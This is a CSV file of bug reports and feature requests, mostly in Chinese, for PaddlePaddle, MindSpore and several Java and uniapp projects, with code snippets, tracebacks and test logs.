title,text
unsqueeze op 不支持int32类型,"异常信息如下：   <code>: #-*- coding: utf-8 -*- from paddle import fluid import numpy as np inputs = fluid.layers.data(name='inputs',shape=[], dtype='int32') outputs = fluid.layers.unsqueeze(inputs, axes=0) place = fluid.CPUPlace() exe = fluid.Executor(place=place) exe.run(fluid.default_startup_program()) outputs_np = exe.run(feed={'inputs': np.array([1], dtype='int32')}, fetch_list=[outputs])[0] print(outputs_np) Traceback (most recent call last): File ""test_for_unsqueeze.py"", line 7, in &lt;module&gt; outputs = fluid.layers.unsqueeze(inputs, axes=0) File ""/home/zhoubo01/tools/miniconda2/envs/opensim-rl/lib/python3.6/site-packages/paddle/fluid/layers/nn.py"", line 5221, in unsqueeze ""XShape"": x_shape}) File ""/home/zhoubo01/tools/miniconda2/envs/opensim-rl/lib/python3.6/site-packages/paddle/fluid/layer_helper.py"", line 50, in append_op return self.main_program.current_block().append_op(*args, **kwargs) File ""/home/zhoubo01/tools/miniconda2/envs/opensim-rl/lib/python3.6/site-packages/paddle/fluid/framework.py"", line 1207, in append_op op = Operator(block=self, desc=op_desc, *args, **kwargs) File ""/home/zhoubo01/tools/miniconda2/envs/opensim-rl/lib/python3.6/site-packages/paddle/fluid/framework.py"", line 653, in __init__ self.desc.check_attrs() paddle.fluid.core.EnforceNotMet: Cannot get attribute axes by type std::vector&lt;int, std::allocator&lt;int&gt; &gt;, its type is int at [/paddle/paddle/fluid/framework/attribute.h:42]"
dynamic_lstm 参数与lstm门对应关系,"对于lstm，我们现在我使用，用普通的lstm。公式应该是 这样层参数个数应该是2* (1 *4)个。lstm内部kernel的参数个数也应该是 1 * (1 *4)个。但 1、fc_0参数，blstm_0.w_0，blstm_0.b_0和 与W_f,W_i,W_c,W_o的对应关系是？ 2、gate_activation可以自定义吗？现在的文档里写必须是 [tanh ,identity ,relu ,sigmoid]中的一个？   <code>: shape = [2] gate_size = 1 data = fluid.layers.data(name='data', shape=shape, dtype='float32') input_forward_proj = fluid.layers.fc(name='fc_0',input=data, size=gate_size * 4, act=None, bias_attr=False) forward, state = fluid.layers.dynamic_lstm( name='blstm_0', input=input_forward_proj, size=gate_size * 4,use_peepholes=False,gate_activation='sigmoid') place = fluid.CPUPlace() feeder = fluid.DataFeeder(place=place,feed_list=[data]) exe = fluid.Executor(place) exe.run(fluid.default_startup_program()) results = exe.run(fluid.default_main_program(), feed={'data':lod_tensor}, fetch_list=['blstm_0.w_0'],return_numpy=False) print np.array(results[0]).shape use_peepholes=False fc_0"
模仿 system 新增了一个自定义的业务模块，将生成的代码放入其中，登陆查询数据出现报错,将生成的代码放入原来的模块system中，运行时一切正常，将它们移动到自己新建的模块exam中，打开列表时出现下面的问题：   <code>: Invalid bound statement (not found): com.ruoyi.exam.mapper.ExamQuestionMapper.selectExamQuestionList
uniapp BLE蓝牙监听收不到回传消息,"设置成功了。但是uni.onBLECharacteristicValueChange(function (characteristic) { console.log('characteristic value comed:', characteristic) }) 收不到回传消息   <code>: uni.notifyBLECharacteristicValueChange({ state: true, // 启用 notify 功能 // 这里的 deviceId 需要已经通过 createBLEConnection 与对应设备建立链接 deviceId:deviceId, // 这里的 serviceId 需要在 getBLEDeviceServices 接口中获取 serviceId:serviceId, // 这里的 characteristicId 需要在 getBLEDeviceCharacteristics 接口中获取 characteristicId:characteristicId, success(res) { console.log('========设置通知监听成功:' + res.errMsg); console.log(JSON.stringify(res)); }"
[CT][MS][ CI]BackPropagate] AbstractTuple size: AbstractTuple,": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_net_3d_ops_conv3dtranspose_bn3d_prelu test_net_3d_ops_conv3dtranspose_bn3d_relu pass   <code>: self = &lt;mindspore.common.api._PynativeExecutor object at 0xffff66a4a590&gt; grad = &lt;mindspore.ops.composite.base.GradOperation object at 0xffff3c0afa10&gt; obj = WithLossCell&lt; (_backbone): METrainNet&lt; (net): NestReLUNet&lt; (net): Conv3DTransposeBN3DNet&lt; (bn3d): ...), group=1, has_bias=Falseweight_init=normal, bias_init=zeros, format=NCHW&gt; &gt; (_loss_fn): BCEWithLogitsLoss&lt;&gt; &gt; weights = (Parameter (name=weight, shape=(10, 10, 2, 2, 2), dtype=Float32, requires_grad=True), Parameter (name=mul_w, shape=(32...=Float32, requires_grad=True), Parameter (name=conv2d.weight, shape=(10, 10, 2, 2), dtype=Float32, requires_grad=True)) args = (Tensor(shape=[32, 10, 64, 64], dtype=Float32, value= [[[[ 1.00000000e+00, 1.00000000e+00, 1.00000000e+00 ... 1.000...0, 0.00000000e+00 ... 0.00000000e+00, 0.00000000e+00, 0.00000000e+00]]), Tensor(shape=[], dtype=Float32, value= 1)) kwargs = {} def grad(self, grad, obj, weights, *args, **kwargs): &gt; self._executor.grad_net(grad, obj, weights, *args, *(kwargs.values())) E RuntimeError: mindspore/ccsrc/frontend/optimizer/ad/kpynative.cc:659 BackPropagate] AbstractTuple size: AbstractTuple(element[0]: AbstractTensor(shape: (32, 10, 64, 64, 64), element: AbstractScalar(Type: Float32, Value: AnyValue, Shape: NoShape), value_ptr: 0x261e49c0, value: AnyValue),element[1]: AbstractTensor(shape: (10, 10, 2, 2, 2), element: AbstractScalar(Type: Float32, Value: AnyValue, Shape: NoShape), value_ptr: 0x261e49c0, value: AnyValue),element[2]: AbstractTensor(shape: (32, 10, 65, 65, 65), element: AbstractScalar(Type: Float32, Value: AnyValue, Shape: NoShape), value_ptr: 0x261e49c0, value: AnyValue),) not match primal cnode input size: 1259.1259:[CNode]1264{[0]: ValueNode&lt;PrimitivePy&gt; Conv3DTranspose, [1]: [CNode]1263, [2]: weight} E E # In file /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/ops/composite/multitype_ops/add_impl.py(271)"
服务端设置 直接读取参数配置表，增加统一统一工具,环境信息 pigx版本: 3.9.0 是否修改包名: 否 目前版本 一些默认值 是配置在 配置文件，重构成从 参数表获取的形式 提供统一工具类，支持跨服务获取， 支持缓存   <code>: common-data
Unused parameters in framework.layers.py,In https://github.com/PaddlePaddle/Paddle/blob/66d1c6ce1edad4ee8505347c6dfab5a733b45772/python/paddle/v2/framework/layers.py#L88-L89 the parameters and are not in use?   <code>: program init_program
[ST][MS][NET][ASR-dynamic][GPU 1p]GetDeviceAddress] The size of device address is zero,"ASR-dynamic网络在GPU环境训练报Conv2DBackpropInput算子错误 / 硬件环境: /device GPU : -- MindSpore version :r2.0 commit_id:3942f0a0 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20221010 MindSpore 版本：编译时间202210191215492 r2.0 commit_id:3942f0a0 (/): /mode graph test_ms_asr_dynamic_an4_32_train_check_loss_gpu_1p_0001.py cd solution_test/cases/02network/09audio/asr/train pytest -s test_ms_asr_dynamic_an4_32_train_check_loss_gpu_1p_0001.py 网络训练成功 走给徐攀   <code>: 36.67% : 1.805202s : 36: opt.transforms.opt_a 0.08% : 0.003914s : 1: opt.transforms.opt_after_cconv 0.05% : 0.002637s : 2: opt.transforms.opt_b 0.25% : 0.012410s : 1: opt.transforms.opt_trans_graph [WARNING] MD(18219,7fa21dffb700,python):2022-10-20-00:56:56.489.202 [mindspore/ccsrc/minddata/dataset/engine/datasetops/source/generator_op.cc:195] operator()] Bad performance attention, it takes more than 25 seconds to generator.__next__ new row, which might cause `GetNext` timeout problem when sink_mode=True. You can increase the parameter num_parallel_workers in GeneratorDataset / optimize the efficiency of obtaining samples in the user-defined generator function. [WARNING] MD(18219,7fa206ffd700,python):2022-10-20-00:56:56.566.789 [mindspore/ccsrc/minddata/dataset/engine/datasetops/data_queue_op.cc:824] DetectPerBatchTime] Bad performance attention, it takes more than 25 seconds to fetch a batch of data from dataset pipeline, which might result `GetNext` timeout problem. You may test dataset processing performance(with creating dataset iterator) and optimize it. [CRITICAL] KERNEL(18219,7fa307fff700,python):2022-10-20-00:56:58.301.572 [mindspore/ccsrc/plugin/device/gpu/kernel/gpu_kernel.h:190] GetDeviceAddress] The size of device address is zero, address index: 0, op name is: Conv2DBackpropFilter [CRITICAL] KERNEL(18219,7fa34b369700,python):2022-10-20-00:56:58.302.125 [mindspore/ccsrc/plugin/device/gpu/kernel/gpu_kernel.h:190] GetDeviceAddress] The size of device address is zero, address index: 0, op name is: Conv2DBackpropInput free(): corrupted unsorted chunks"
【众智】【数据算子】CommonVoiceDataset,"1.1算子分析 CommonVoice 数据集加载与解析算子，使得用户在下载并解压 CommonVoice 数据集文件后，可以通过此 API 直接加载到训练/验证用的数据。 Common Voice 是 Mozilla 的开源项目，基于 MPL 协议发行，到目前为止已经诞生了几年时间，它允许志愿者们为语音识别软件的数据库做出贡献，而这个数据库属于公共领域，所有人都可以将这些数据用于语音合成和识别软件。 链接：CommonVoice官网 下载链接:下载链接 返回指向数据集对象的指针，支持三种 Sampler 传递方式。   <code>: class mindspore.dataset.CommonVoiceDataset( dataset_dir, usage='train', num_samples=None, num_parallel_workers=None, shuffle=None, sampler=None, num_shards=None, shard_id=None, cache=None inline std::shared_ptr CommonVoice( const std::string &amp;dataset_dir, const std::string &amp;usage = ""all"", const std::shared_ptr &amp;sampler = std::make_shard(), const std::shared_ptr &amp;cache = nullptr) inline std::shared_ptr CommonVoice( const std::string &amp;dataset_dir, const std::string &amp;usage, const std::reference_wrapper sampler, const std::shared_ptr &amp;cache = nullptr) inline std::shared_ptr CommonVoice( const std::string &amp;dataset_dir, const std::string &amp;usage, Sampler *sampler, const std::shared_ptr &amp;cache = nullptr)"
"[CT][MS][Probability][Normal] normal mean  and func mean both none ,but run pass",": /device ascend : -- MindSpore version : 0.6.0 -- Python version : 3.7.5 -- OS platform and distribution : -- GCC/Compiler version : 7.3.0 pytest -s test_normal.py::test_normal_mean_011   <code>: def test_normal_mean_011(): class Net(nn.Cell): def __init__(self, mean=None, sd=None, seed=0, dtype=dtype.float32, name='Normal'): super().__init__() self.normal = msd.Normal(mean=mean, sd=sd, seed=seed, dtype=dtype, name=name) def construct(self, sd_a): return self.normal.mean(sd=sd_a) sd_a = np.random.rand(3).astype(np.float32) with pytest.raises(ValueError): net = Net() net(Tensor(sd_a)) ________________________________________________________________________________ test_normal_mean_011 ________________________________________________________________________________ @Author(""zwx5320437"") @Level2 def test_normal_mean_011(): class Net(nn.Cell): def __init__(self, mean=None, sd=None, seed=0, dtype=dtype.float32, name='Normal'): super().__init__() self.normal = msd.Normal(mean=mean, sd=sd, seed=seed, dtype=dtype, name=name) def construct(self, sd_a): return self.normal.mean(sd=sd_a) sd_a = np.random.rand(3).astype(np.float32) with pytest.raises(ValueError): net = Net() &gt; net(Tensor(sd_a)) E Failed: DID NOT RAISE &lt;class 'ValueError'&gt; test_normal.py:446: Failed"
fluid need a Print operator just like TF,"When debugging, it is pain to fetch one variable and print in python. And in operator, it is hard to fetch a variable, much trick needs. I found operator in TF with well-defined interface, we can reference it. it is necessary when we discard python .   <code>: whileloop Print forloop"
"Error message: ""ValueError: The checkpoint file does not exist.""","mindspore-assistant /device gpu -- MindSpore version (1.3): -- Python version (python 3.7.5): -- OS platform and distribution (Windows10): -- GCC/Compiler version (7.3.0): I am trying to implement FastRCNN using Mindspore, I am using the code from the offciel gitee as a reference: 'https://gitee.com/mindspore/mindspore/tree/r1.3/model_zoo/official/cv/faster_rcnn' knowint that I am using Mindspore 1.3 and VOC dataset. When I run the train.py code the following error pop up: This is the line of code causing the error: And this is what I have in Config: Why I cant find the above file, do I have to creat the checkpoint file or I have to download from somewhere? Thank you in advance,,   <code>: Traceback (most recent call last): File ""C:/Users/Yaman/PycharmProjects/MindSpore_1.3/train_New.py"", line 114, in &lt;module&gt; param_dict = load_checkpoint(load_path) File ""C:\Users\Yaman\AppData\Local\Programs\Python\Python37\lib\site-packages\mindspore\train\serialization.py"", line 401, in load_checkpoint ckpt_file_name, filter_prefix = _check_checkpoint_param(ckpt_file_name, filter_prefix) File ""C:\Users\Yaman\AppData\Local\Programs\Python\Python37\lib\site-packages\mindspore\train\serialization.py"", line 478, in _check_checkpoint_param raise ValueError(""The checkpoint file does not exist."") ValueError: The checkpoint file does not exist. load_path = config.pre_trained if load_path != """": param_dict = load_checkpoint(load_path) pre_trained: ""/cache/train/fasterrcnn/faster_rcnn-12_7393.ckpt"""
"[MS][LITE][master] GPU+ml_intent_detect_hi_v2.tflite, inference fail.",": /device gpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version :   <code>: 测试版本：master，commi_id: bfaf780c9916655b872d06505632b59746a76b88（2021-08-02-10-12-33） 测试用例：ml_intent_detect_hi_v2.tflite, 将标杆数据以及ms模型推送到手机，进行推理验证精度 测试结果：预期模型推理结果精度对比成功，实际GPU_FP32,仅有P20手机推理失败，GPU_FP16，仅有P8和Honor6推理成功，其余手机推理均失败 08-04 14:31:48.022 26707 26707 E MS_LITE : [mindspore/lite/src/runtime/gpu/opencl/opencl_runtime.cc:502] BuildProgram] Program build log: &lt;source&gt;:18:12: error: call to 'clamp' is ambiguous 08-04 14:31:48.022 26707 26707 E MS_LITE : result = clamp(result, (FLT)(act_min), (FLT)(act_max)); 08-04 14:31:48.022 26707 26707 E MS_LITE : ^~~~~ 08-04 14:31:48.022 26707 26707 E MS_LITE : 08-04 14:31:48.022 26707 26707 E MS_LITE : note: candidate function 08-04 14:31:48.022 26707 26707 E MS_LITE : note: candidate function 08-04 14:31:48.022 26707 26707 E MS_LITE : error: Compiler frontend failed (error code 60) 08-04 14:31:48.022 26707 26707 E MS_LITE : [mindspore/lite/src/runtime/gpu/opencl/opencl_runtime.cc:504] BuildProgram] Build program failed: Build program failure 08-04 14:31:48.022 26707 26707 E MS_LITE : [mindspore/lite/src/runtime/gpu/opencl/opencl_runtime.cc:409] BuildKernel] Arithmetic build failed! 08-04 14:31:48.022 26707 26707 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/opencl_subgraph.cc:331] Prepare] prepare node Add-9 failed 08-04 14:31:48.022 26707 26707 E MS_LITE : [mindspore/lite/src/lite_session.cc:598] PrepareKernels] Prepare kernel GpuSubGraph0 failed: -1 08-04 14:31:48.022 26707 26707 E MS_LITE : [mindspore/lite/src/lite_session.cc:510] CompileGraph] Prepare kernels failed: -1 08-04 14:31:48.022 26707 26707 E MS_LITE : [mindspore/lite/src/cxx_api/model/model_impl.cc:126] Build] Build model failed. 08-04 14:31:48.029 26707 26707 E MS_LITE : [mindspore/lite/src/cxx_api/model/model_impl.cc:252] GetInputs] Session is null."
Shall we need a cache API for every dataset module?,"背景： 在做book的Docker Image时需要提前将dataset的数据缓存起来，尝试过以下方法： 用API直接下载的方式，类似 缺点是每次增加一个dataset时，需要修改代码 反射moudle调用里面的test函数，类似: 但有存在函数名字不一致，或者需要参数等情况。 建议 考虑在每个module加一个的API来完成缓存的操作,这样缓存的操作会长成以下这样：   <code>: # Cache conll05 dataset.common.download(dataset.conll05.WORDDICT_URL, 'conll05st', \ dataset.conll05.WORDDICT_MD5) for name filter(lambda x: not x.startswith(""__""), dir(paddle.v2.dataset)): mod = importlib.import_module(""paddle.v2.dataset.%s""%name) for method in filter(lambda x: x.startswith(""test""), dir(mod)): getattr(mod, ""test"")() test cache_to_local() for name filter(lambda x: not x.startswith(""__""), dir(paddle.v2.dataset)): getattr(importlib.import_module(""paddle.v2.dataset.%s""%name), ""cache_to_local"")()"
Forest实例化的接口调用hashCode会出现StackOverflowError,Forest: 1.5.19 Backend: (okhttp或httpclient)/version 该问题是如何引起的？ 报错信息/完整请求日志（如果没有请求日志请把开关打开） 接口定义（必要时请提供）   <code>: api = Forest.config().client(ChaoXingApi.class); Console.log(api.hashCode());
求帮助: pojo继承父类，通过泛型传递到父类中，这时插入时如何插入泛型的值,"下面的代码是父类中的字段，子类继承自父类。然后ENTITY泛型是子类的类型，这样如何插入到数据库中? 实体中时parent，表中是parent_id   <code>: @TableField(""parent_id"") private ENTITY parent;"
【众智】【计算-GPU开发】Gcd,逐元素计算两个tensor的最大公约数。 算子原语 接口目录：mindspore/python/mindspore/ops/operations/math_ops.py x1 x2 y 对应底层算子 对应底层算子Gcd Classify Name Type TypeRange Required Doc AttrDefault INPUT x1 int32/int64 TRUE INPUT x2 int32/int64 TRUE OUTPUT y int32/int64 TRUE PyTorch1.8.1接口： torch.gcd https://pytorch.org/docs/1.8.1/generated/torch.gcd.html 3. 异常处理 4. 算子反向 无反向   <code>: class Gcd(Primitive):
